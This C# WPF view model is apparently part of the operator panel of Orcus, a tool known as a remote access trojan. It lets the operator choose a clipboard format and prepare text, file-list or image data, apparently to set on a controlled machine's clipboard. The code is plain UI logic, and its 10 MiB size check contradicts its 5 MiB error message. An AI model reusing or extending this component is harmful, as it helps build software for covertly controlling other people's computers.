using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Windows;
using Microsoft.Win32;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.ClipboardManager;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels.ClipboardManager
{
    public class ClipboardManagerEditViewModel : PropertyChangedBase
    {
        private RelayCommand _cancelCommand;
        private RelayCommand _changeCommand;
        private ClipboardData _clipboardData;
        private bool? _dialogResult;
        private ClipboardFormat _selectedClipboardFormat;
        private RelayCommand<ImageClipboardData> _selectImageCommand;

        public ClipboardManagerEditViewModel(ClipboardData clipboardData)
        {
            Formats = new List<ClipboardFormat>
            {
                ClipboardFormat.Text,
                ClipboardFormat.UnicodeText,
                ClipboardFormat.Rtf,
                ClipboardFormat.Html,
                ClipboardFormat.CommaSeparatedValue,
                ClipboardFormat.FileDrop,
                ClipboardFormat.Bitmap
            };
            _selectedClipboardFormat = clipboardData.ClipboardFormat;
            _clipboardData = clipboardData;
        }

        public ClipboardManagerEditViewModel() : this(new StringClipboardData("", ClipboardFormat.Text))
        {
        }


        public List<ClipboardFormat> Formats { get; }

        public bool? DialogResult
        {
            get { return _dialogResult; }
            set { SetProperty(value, ref _dialogResult); }
        }

        public ClipboardFormat SelectedClipboardFormat
        {
            get { return _selectedClipboardFormat; }
            set
            {
                if (SetProperty(value, ref _selectedClipboardFormat))
                    switch (value)
                    {
                        case ClipboardFormat.Text:
                        case ClipboardFormat.UnicodeText:
                        case ClipboardFormat.Rtf:
                        case ClipboardFormat.Html:
                        case ClipboardFormat.CommaSeparatedValue:
                            ClipboardData = new StringClipboardData("", value);
                            break;
                        case ClipboardFormat.FileDrop:
                            ClipboardData = new StringListClipboardData(new List<StringListEntry>(), value);
                            break;
                        case ClipboardFormat.Bitmap:
                            ClipboardData = new ImageClipboardData(null, 0, 0, value);
                            break;
                    }
            }
        }

        public ClipboardData ClipboardData
        {
            get { return _clipboardData; }
            set { SetProperty(value, ref _clipboardData); }
        }

        public RelayCommand<ImageClipboardData> SelectImageCommand
        {
            get
            {
                return _selectImageCommand ?? (_selectImageCommand = new RelayCommand<ImageClipboardData>(parameter =>
                {
                    var ofd = new OpenFileDialog
                    {
                        Filter = $"{Application.Current.Resources["ImageFiles"]}|*.png;*.jpg;*.gif;*.bmp"
                    };

                    if (WindowServiceInterface.Current.ShowFileDialog(ofd) == true)
                    {
                        var fileInfo = new FileInfo(ofd.FileName);
                        if (!fileInfo.Exists || fileInfo.Length > 1024 * 1024 * 10)
                        {
                            WindowServiceInterface.Current.ShowMessageBox(this,
                                (string) Application.Current.Resources["ImageCannotBeGreaterThan5MiB"],
                                (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                                MessageBoxImage.Error);
                            return;
                        }

                        ClipboardData = null;
                        parameter.BitmapData = File.ReadAllBytes(ofd.FileName);
                        ClipboardData = parameter;
                    }
                }));
            }
        }

        public RelayCommand CancelCommand
        {
            get
            {
                return _cancelCommand ?? (_cancelCommand = new RelayCommand(parameter => { DialogResult = false; }));
            }
        }

        public RelayCommand ChangeCommand
        {
            get { return _changeCommand ?? (_changeCommand = new RelayCommand(parameter => { DialogResult = true; })); }
        }
    }
}